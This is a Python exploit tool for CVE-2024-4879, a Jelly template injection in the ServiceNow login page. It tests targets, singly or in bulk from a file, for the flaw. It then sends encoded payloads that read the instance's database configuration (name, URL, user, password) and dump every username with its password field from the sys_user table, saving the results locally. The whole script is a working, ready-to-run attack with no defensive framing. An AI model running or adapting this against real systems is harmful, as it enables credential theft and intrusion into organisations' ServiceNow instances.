import requests
import argparse
import sys
import urllib3
import os
import re

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = """
\033[92m  /$$$$$$  /$$    /$$ /$$$$$$$$      /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$         /$$   /$$  /$$$$$$  /$$$$$$$$ /$$$$$$
 /$$__  $$| $$   | $$| $$_____/     /$$__  $$ /$$$_  $$ /$$__  $$| $$  | $$        | $$  | $$ /$$__  $$|_____ $$//$$__  $$
| $$  \__/| $$   | $$| $$          |__/  \ $$| $$$$\ $$|__/  \ $$| $$  | $$        | $$  | $$| $$  \ $$     /$$/| $$  \ $$
| $$      |  $$ / $$/| $$$$$ /$$$$$$ /$$$$$$/| $$ $$ $$  /$$$$$$/| $$$$$$$$ /$$$$$$| $$$$$$$$|  $$$$$$/    /$$/ |  $$$$$$$
| $$       \  $$ $$/ | $$__/|______//$$____/ | $$\ $$$$ /$$____/ |_____  $$|______/|_____  $$ >$$__  $$   /$$/   \____  $$
| $$    $$  \  $$$/  | $$          | $$      | $$ \ $$$| $$            | $$              | $$| $$  \ $$  /$$/    /$$  \ $$
|  $$$$$$/   \  $/   | $$$$$$$$    | $$$$$$$$|  $$$$$$/| $$$$$$$$      | $$              | $$|  $$$$$$/ /$$/    |  $$$$$$/
 \______/     \_/    |________/    |________/ \______/ |________/      |__/              |__/ \______/ |__/      \______/

    \033[0m"""  # Added blue color for the ASCII art and reset
    print(art)

def format_url(targetIP):
    if not targetIP.startswith(('http://', 'https://')):
        targetIP = f"https://{targetIP}"
    return targetIP

def checkVuln(targetIP):
    try:
        checkUrl = f"{targetIP}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
        print(f"\033[92m\n[+] Checking the target: {targetIP}\n \033[0m")

        # Make the request and print the status
        response = requests.get(checkUrl, verify=False, timeout=10)
        print(f"Target Domain: {targetIP}")
        print(f"Response Status Code: {response.status_code}")

        if response.status_code == 200:
            if '1337' in response.text:
                print("\033[92mTarget is vulnerable!! \033[0m \n")
                getUserChoice = input("\033[92mDump DB? (Y)es or (N)o \033[0m \n")
                if getUserChoice.lower() in ["y", "yes"]:
                    getDBinfo(targetIP)
                else:
                    print("Exiting..")
            else:
                print("\033[91mTarget might not be vulnerable...\033[0m")
        else:
            print("\033[91mTarget cannot be reached or no vulnerability detected...\033[0m")
    except Exception as e:
        print(f"Some error occurred: {e}")
        print("Exiting..")

def getDBinfo(targetIP):
    getDBinfoURL = f"{targetIP}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"

    try:
        response = requests.get(getDBinfoURL, verify=False, timeout=10)
        if response.status_code == 200 and 'glide.db.properties' in response.text:
            print("\033[92mFetching the DB info.. \033[0m \n")
            os.makedirs(targetIP, exist_ok=True)

            pattern = r'glide\.db\.(name|rdbms|url|user|password)\s*&#61;\s*(\S+)'
            matches = re.findall(pattern, response.text)
            extracted_values = {f'glide.db.{key}': value for key, value in matches}

            with open(os.path.join(targetIP, 'DBinfo'), 'w') as f:
                for key, value in extracted_values.items():
                    f.write(f"{key}: {value}\n")
                    print(f"{key}: {value}")
            userDBInstance(targetIP)
        else:
            print("\033[91mCould not fetch DB info...\033[0m")

    except Exception as e:
        print(f"Some error occurred: {e}")
        print("Exiting..")

def userDBInstance(targetIP):
    userDBInstanceUrl = f"{targetIP}/login.do?jvar_page_title=%3Cstyle%3E%3Cj%3Ajelly%20xmlns%3Aj%3D%22jelly%3Acore%22%20xmlns%3Ag%3D%27glide%27%3E%3Cg%3Aevaluate%3Egr%3Dnew%20GlideRecord%28%22sys_user%22%29%3Bgr.query%28%29%3Bs%3D%22%22%3Bwhile%28gr.next%28%29%29s%3Ds.concat%28gr.user_name%2C%22%20%3A%20%22%2Cgr.user_password%2C%22%3Cbr%2F%3E%22%29%3Bgs.addErrorMessage%28s%29%3B%3C%2Fg%3Aevaluate%3E%3C%2Fj%3Ajelly%3E%3C%2Fstyle%3E"

    try:
        response = requests.get(userDBInstanceUrl, verify=False, timeout=10)
        if response.status_code == 200 and 'Error Message' in response.text:
            print("\033[92m\nAttempting to fetch the User DB of the instance.. \033[0m \n")

            pattern = r'Error Message(?:.*?)(.*): <br />'
            matches = re.findall(pattern, response.text)
            if matches:
                result = matches[-1] + ": <br />"
                cleaned_result = result.replace(': <br />', ' ').replace('&#61;', '=').replace('<br />', ' ').replace('</span></span><div class="outputmsg_text">', '').replace(' : ', ':')
                info_list = cleaned_result.split()

                with open(os.path.join(targetIP, 'userDBInstanceInfo'), 'a') as g:
                    for i in info_list:
                        g.write(i + '\n')
                        print(i)
            else:
                print("\033[91mCould not fetch the User DB of the instance..\033[0m")
        else:
            print("\033[91mUser DB of the instance not found\033[0m")
    except Exception as e:
        print(f"Some error occurred: {e}")
        print("Exiting..")

def process_targets_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = file.readlines()
            for target in targets:
                target = target.strip()
                if target:
                    formatted_target = format_url(target)
                    checkVuln(formatted_target)
    except Exception as e:
        sys.exit(f"Failed to read the file: {e}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-4879")
    parser.add_argument("-i", '--targetIP', help="The target URL")
    parser.add_argument("-m", '--multipleTargets', help="File with multiple target URLs")
    args = parser.parse_args()

    try:
        ascii()
        if args.targetIP:
            formatted_target = format_url(args.targetIP)
            checkVuln(formatted_target)
        elif args.multipleTargets:
            process_targets_from_file(args.multipleTargets)
        else:
            sys.exit("No target provided. Use -i for a single target or -m for multiple targets.")
    except Exception as e:
        sys.exit(f"Some error occurred: {e}")

if __name__ == "__main__":
    main()
